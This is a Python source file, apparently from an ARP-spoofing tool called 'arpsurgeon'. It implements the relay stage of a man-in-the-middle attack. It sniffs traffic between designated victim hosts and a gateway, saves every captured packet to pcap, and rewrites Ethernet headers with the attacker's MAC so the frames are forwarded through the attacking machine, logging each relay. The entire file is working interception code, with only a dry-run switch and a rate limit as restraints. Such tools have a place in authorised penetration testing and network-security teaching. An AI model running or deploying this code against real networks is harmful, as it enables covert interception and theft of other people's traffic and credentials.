from __future__ import annotations

import time
from collections import deque
from threading import Event
from typing import Dict, Optional

from scapy.all import Ether, IP, conf, get_if_hwaddr, sendp, sniff  # type: ignore

from arpsurgeon.arp import ArpTarget
from arpsurgeon.session_log import JsonlLogger, PcapLogger


def _build_bpf(victim_ips: list[str], gateway_ip: str) -> str:
    hosts = " or ".join([f"host {ip}" for ip in victim_ips + [gateway_ip]])
    return f"ip and ({hosts})"


def relay(
    victims: list[ArpTarget],
    gateway: ArpTarget,
    iface: Optional[str],
    duration: Optional[int],
    pcap_path: Optional[str],
    jsonl_path: Optional[str],
    pcap_filter: Optional[str],
    max_rate: Optional[int],
    dry_run: bool,
    stop_event: Optional[Event],
    pcap_rotate_mb: Optional[int],
    pcap_rotate_seconds: Optional[int],
) -> None:
    if iface:
        conf.iface = iface
    attacker_mac = get_if_hwaddr(conf.iface)
    victim_map: Dict[str, ArpTarget] = {victim.ip: victim for victim in victims}
    jsonl_logger = JsonlLogger(jsonl_path)
    max_bytes = pcap_rotate_mb * 1024 * 1024 if pcap_rotate_mb else None
    pcap_logger = PcapLogger(pcap_path, max_bytes=max_bytes, max_seconds=pcap_rotate_seconds)
    bpf = pcap_filter or _build_bpf(list(victim_map.keys()), gateway.ip)
    timestamps = deque()

    def handler(pkt) -> None:
        now = time.time()
        pcap_logger.write(pkt)
        if not pkt.haslayer(IP) or not pkt.haslayer(Ether):
            return
        ether = pkt.getlayer(Ether)
        ip = pkt.getlayer(IP)
        if ether.src == attacker_mac:
            return
        if ip.src in victim_map:
            target_mac = gateway.mac
        elif ip.src == gateway.ip and ip.dst in victim_map:
            target_mac = victim_map[ip.dst].mac
        else:
            return
        if max_rate:
            timestamps.append(now)
            while timestamps and now - timestamps[0] > 1:
                timestamps.popleft()
            if len(timestamps) > max_rate:
                return
        ether.dst = target_mac
        ether.src = attacker_mac
        if not dry_run:
            sendp(ether, verbose=False)
        jsonl_logger.log(
            {
                "type": "relay",
                "src_ip": ip.src,
                "dst_ip": ip.dst,
                "src_mac": ether.src,
                "dst_mac": ether.dst,
                "ts": now,
                "dry_run": dry_run,
            }
        )

    start = time.monotonic()
    while True:
        if duration is not None:
            remaining = duration - (time.monotonic() - start)
            if remaining <= 0:
                break
            timeout = min(1.0, remaining)
        else:
            timeout = 1.0 if stop_event else None
        sniff(
            filter=bpf,
            prn=handler,
            store=False,
            timeout=timeout,
            stop_filter=(lambda _pkt: stop_event.is_set()) if stop_event else None,
        )
        if stop_event and stop_event.is_set():
            break
    jsonl_logger.close()
    pcap_logger.close()
